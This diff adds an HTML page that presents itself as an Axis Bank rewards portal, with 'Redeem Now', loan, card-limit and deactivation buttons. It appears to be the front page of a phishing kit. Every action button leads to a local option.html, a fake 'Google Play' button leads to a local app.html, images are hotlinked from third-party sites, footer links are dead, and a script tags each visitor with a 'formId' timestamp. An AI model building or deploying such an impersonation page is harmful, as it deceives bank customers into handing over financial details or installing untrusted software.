@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Axis Bank Rewards - Exclusive Offers</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f7fa;
+            color: #1e293b;
+        }
+
+        /* Banner Section */
+        .banner-section {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .banner-slider {
+            display: flex;
+            transition: transform 0.5s ease;
+        }
+
+        .banner-slide {
+            min-width: 100%;
+        }
+
+        .banner-slide img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* Axis Bank Header - New Color Scheme (Axis Purple & Red) */
+        .axis-header {
+            background: linear-gradient(135deg, #9B1D2C, #B22234, #6A1B2A);
+            /* Axis Bank red theme */
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .axis-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .axis-logo img {
+            width: 85px;
+            height: 45px;
+            background: white;
+            border-radius: 10px;
+            padding: 5px;
+            object-fit: contain;
+        }
+
+        .axis-logo-text h2 {
+            color: white;
+            font-size: 18px;
+        }
+
+        .axis-logo-text p {
+            color: #FFCDD2;
+            font-size: 10px;
+        }
+
+        .axis-notify {
+            background: #FF6F00;
+            color: white;
+            padding: 6px 15px;
+            border-radius: 25px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        /* Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        /* Redeem Button - Axis Orange Accent */
+        .redeem-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #FF6F00, #E65100);
+            color: white;
+            padding: 14px 35px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(230, 81, 0, 0.3);
+        }
+
+        .redeem-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(230, 81, 0, 0.4);
+        }
+
+        /* Axis App Download Button - Red Theme */
+        .axis-app-download {
+            background: linear-gradient(135deg, #9B1D2C, #6A1B2A);
+            border-radius: 20px;
+            padding: 15px 25px;
+            margin: 20px auto;
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+
+        .axis-app-download:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+
+        .axis-app-download i {
+            font-size: 40px;
+            color: white;
+        }
+
+        .axis-app-text {
+            text-align: left;
+        }
+
+        .axis-app-text small {
+            font-size: 11px;
+            color: #FFCDD2;
+            display: block;
+        }
+
+        .axis-app-text span {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+        }
+
+        /* Title - Axis Orange Underline */
+        .section-title {
+            font-size: 28px;
+            color: #9B1D2C;
+            margin: 30px 0 20px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 3px;
+            background: #FF6F00;
+            border-radius: 2px;
+        }
+
+        /* Down Arrow */
+        .down-arrow {
+            text-align: center;
+            margin: 20px 0;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(10px);
+            }
+        }
+
+        .down-arrow img {
+            width: 50px;
+            opacity: 0.7;
+        }
+
+        /* Cards Grid */
+        .cards-wrapper {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 25px;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Axis Card Design */
+        .axis-card {
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            transition: all 0.3s;
+            text-align: center;
+            padding: 25px 20px;
+            position: relative;
+            border: 1px solid #e2e8f0;
+        }
+
+        .axis-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+            border-color: #FF6F00;
+        }
+
+        .card-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #9B1D2C, #B22234);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+        }
+
+        .card-icon i {
+            font-size: 40px;
+            color: white;
+        }
+
+        .card-icon.credit {
+            background: linear-gradient(135deg, #FF6F00, #E65100);
+        }
+
+        .card-icon.loan {
+            background: linear-gradient(135deg, #1E88E5, #0D47A1);
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #9B1D2C;
+            margin-bottom: 10px;
+        }
+
+        .card-desc {
+            font-size: 13px;
+            color: #64748b;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .apply-btn {
+            background: #9B1D2C;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .apply-btn:hover {
+            background: #FF6F00;
+            color: white;
+        }
+
+        /* Footer - Axis Theme */
+        .axis-footer {
+            background: linear-gradient(135deg, #9B1D2C, #6A1B2A, #B22234);
+            color: #FFCDD2;
+            padding: 40px 20px 25px;
+            margin-top: 40px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            color: #FFCDD2;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: #FF6F00;
+        }
+
+        .footer-copyright {
+            font-size: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 20px;
+            margin-top: 20px;
+        }
+
+        /* Slider Dots */
+        .slider-dots {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: -30px;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .dot.active {
+            background: #FF6F00;
+            width: 25px;
+            border-radius: 10px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .cards-wrapper {
+                grid-template-columns: 1fr;
+                padding: 15px;
+            }
+
+            .section-title {
+                font-size: 24px;
+            }
+
+            .axis-header {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .redeem-btn {
+                font-size: 16px;
+                padding: 12px 30px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 15px;
+            }
+
+            .axis-app-download {
+                padding: 12px 20px;
+            }
+
+            .axis-app-download i {
+                font-size: 30px;
+            }
+
+            .axis-app-text span {
+                font-size: 14px;
+            }
+        }
+    </style>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+
+<body>
+
+    <!-- Axis Bank Header - Updated Branding -->
+    <div class="axis-header">
+        <div class="axis-logo">
+            <!-- Axis Bank Official Logo URL (using reliable public asset) -->
+            <img src="https://tse4.mm.bing.net/th/id/OIP.6L1wjIlCt32T_qbBKddu6wHaEK?rs=1&pid=ImgDetMain&o=7&rm=3"
+                alt="Axis Bank Logo" onerror="this.src='https://www.axisbank.com/images/default-source/axis-bank/logo/axis-logo.png'">
+            <div class="axis-logo-text">
+                <h2>Axis Bank</h2>
+                <p>Badhti Ka Naam Zindagi | Since 1993</p>
+            </div>
+        </div>
+        <div class="axis-notify">
+            <i class="fas fa-bell"></i> NOTIFY
+        </div>
+    </div>
+
+    <!-- Banner Slider - Updated with Axis Bank relevant banners (using high-quality Axis bank related images) -->
+    <div class="banner-section">
+        <div class="banner-slider" id="bannerSlider">
+            <div class="banner-slide">
+                <img src="https://cf.shopee.ph/file/6a56af36a37116c3a1ccbce4407119e6"
+                    alt="Axis Bank Banner 1"
+                    onerror="this.src='https://cf.shopee.ph/file/6a56af36a37116c3a1ccbce4407119e6'">
+            </div>
+            <div class="banner-slide">
+                <img src="https://tse3.mm.bing.net/th/id/OIP.TUAYUwWnD-A4MM_YcqQ72QHaD4?rs=1&pid=ImgDetMain&o=7&rm=3"
+                    alt="Axis Bank Banner 2"
+                    onerror="this.src='https://tse3.mm.bing.net/th/id/OIP.TUAYUwWnD-A4MM_YcqQ72QHaD4?rs=1&pid=ImgDetMain&o=7&rm=3'">
+            </div>
+            <div class="banner-slide">
+                <img src="https://www.axis.bank.in/images/default-source/l4-banner/card/phase-2-cards_copy-and-without-copy/samsung-axis-bank-signature-credit-card_copy/samsung-axis-bank-signature-credit-card-1366-x-400-desktop.webp?sfvrsn=bc6b8bb9_1"
+                    alt="Axis Bank Banner 3"
+                    onerror="this.src='https://www.axis.bank.in/images/default-source/l4-banner/card/phase-2-cards_copy-and-without-copy/samsung-axis-bank-signature-credit-card_copy/samsung-axis-bank-signature-credit-card-1366-x-400-desktop.webp?sfvrsn=bc6b8bb9_1'">
+            </div>
+        </div>
+        <div class="slider-dots" id="sliderDots"></div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <a href="option.html" class="redeem-btn">
+            <i class="fas fa-gift"></i> REDEEM NOW
+        </a>
+
+        <!-- Axis Bank App Download Button -->
+        <div style="margin-top: 25px;">
+            <a href="app.html" class="axis-app-download">
+                <i class="fab fa-google-play"></i>
+                <div class="axis-app-text">
+                    <small>GET IT ON</small>
+                    <span>Google Play</span>
+                </div>
+            </a>
+        </div>
+
+        <h2 class="section-title">UNLOCK EXCLUSIVE REWARDS</h2>
+
+        <div class="down-arrow">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='50' height='50' viewBox='0 0 24 24' fill='none' stroke='%23FF6F00' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E"
+                alt="Down Arrow">
+        </div>
+    </div>
+
+    <!-- Services Cards - Axis Bank Style -->
+    <div class="cards-wrapper">
+        <!-- Application Status -->
+        <div class="axis-card">
+            <div class="card-icon">
+                <i class="fas fa-chart-line"></i>
+            </div>
+            <div class="card-title">Application Status</div>
+            <div class="card-desc">Check your credit card / loan application status instantly</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+
+        <!-- Plan Deactivate -->
+        <div class="axis-card">
+            <div class="card-icon">
+                <i class="fas fa-ban"></i>
+            </div>
+            <div class="card-title">Plan Deactivate</div>
+            <div class="card-desc">Deactivate your existing credit card or savings plan</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+
+        <!-- Limit Increase -->
+        <div class="axis-card">
+            <div class="card-icon credit">
+                <i class="fas fa-arrow-up"></i>
+            </div>
+            <div class="card-title">Limit Increase Application</div>
+            <div class="card-desc">Request for credit limit increase on your Axis card</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+
+        <!-- Loan Application -->
+        <div class="axis-card">
+            <div class="card-icon loan">
+                <i class="fas fa-rupee-sign"></i>
+            </div>
+            <div class="card-title">Loan Application</div>
+            <div class="card-desc">Apply for personal loan up to ₹75 Lakhs at attractive rates</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+
+        <!-- New Application Form -->
+        <div class="axis-card">
+            <div class="card-icon">
+                <i class="fas fa-file-alt"></i>
+            </div>
+            <div class="card-title">New Application Form</div>
+            <div class="card-desc">Fill new credit card application form & get instant approval</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+
+        <!-- Online Use Application -->
+        <div class="axis-card">
+            <div class="card-icon credit">
+                <i class="fas fa-globe"></i>
+            </div>
+            <div class="card-title">Online Use Application</div>
+            <div class="card-desc">Enable your Axis card for secure online transactions</div>
+            <a href="option.html" class="apply-btn">APPLY NOW</a>
+        </div>
+    </div>
+
+    <!-- Axis Bank Footer -->
+    <footer class="axis-footer">
+        <div class="footer-links">
+            <a href="#">Terms & Conditions</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Contact Support</a>
+            <a href="#">Branch Locator</a>
+            <a href="#">ATM Locator</a>
+        </div>
+        <div class="footer-links">
+            <a href="#"><i class="fab fa-facebook-f"></i> Facebook</a>
+            <a href="#"><i class="fab fa-twitter"></i> Twitter</a>
+            <a href="#"><i class="fab fa-linkedin-in"></i> LinkedIn</a>
+            <a href="#"><i class="fab fa-instagram"></i> Instagram</a>
+        </div>
+        <div class="footer-copyright">
+            <p>Copyright © 2025 | Powered by <strong style="color: #FF6F00;">Axis Bank Limited</strong></p>
+            <p style="margin-top: 10px;">🔒 256-bit SSL Secure Banking | Scheduled Bank - RBI Regulated</p>
+        </div>
+    </footer>
+
+    <script>
+        // Banner Slider
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.banner-slide');
+        const totalSlides = slides.length;
+        const slider = document.getElementById('bannerSlider');
+        const dotsContainer = document.getElementById('sliderDots');
+
+        // Create dots
+        if (dotsContainer) {
+            for (let i = 0; i < totalSlides; i++) {
+                const dot = document.createElement('div');
+                dot.classList.add('dot');
+                if (i === 0) dot.classList.add('active');
+                dot.onclick = () => goToSlide(i);
+                dotsContainer.appendChild(dot);
+            }
+        }
+
+        function goToSlide(index) {
+            currentSlide = index;
+            if (slider) {
+                slider.style.transform = `translateX(-${currentSlide * 100}%)`;
+            }
+            updateDots();
+        }
+
+        function updateDots() {
+            const dots = document.querySelectorAll('.dot');
+            dots.forEach((dot, index) => {
+                dot.classList.toggle('active', index === currentSlide);
+            });
+        }
+
+        function nextSlide() {
+            currentSlide = (currentSlide + 1) % totalSlides;
+            goToSlide(currentSlide);
+        }
+
+        // Auto slide every 5 seconds
+        if (totalSlides > 0) {
+            setInterval(nextSlide, 5000);
+        }
+
+        // Function to create or update a timestamp in local storage
+        function updateTimestamp() {
+            const currentTimestamp = Date.now();
+            if (localStorage.getItem('formId')) {
+                localStorage.setItem('formId', currentTimestamp);
+                console.log('Timestamp updated to:', currentTimestamp);
+            } else {
+                localStorage.setItem('formId', currentTimestamp);
+                console.log('Timestamp created:', currentTimestamp);
+            }
+        }
+
+        window.onload = updateTimestamp;
+        
+        // Bonus: Fallback for images if any external fails
+        document.querySelectorAll('img').forEach(img => {
+            img.onerror = function() {
+                if (!this.dataset.fallback) {
+                    this.dataset.fallback = 'true';
+                    if (this.src.includes('axisbank')) {
+                        this.src = 'https://via.placeholder.com/1200x400/9B1D2C/FFFFFF?text=Axis+Bank+Offer';
+                    } else if (this.closest('.banner-slide')) {
+                        this.src = 'https://via.placeholder.com/1200x400/FF6F00/FFFFFF?text=Axis+Bank+Rewards+Banner';
+                    }
+                }
+            };
+        });
+    </script>
+</body>
+
+</html>
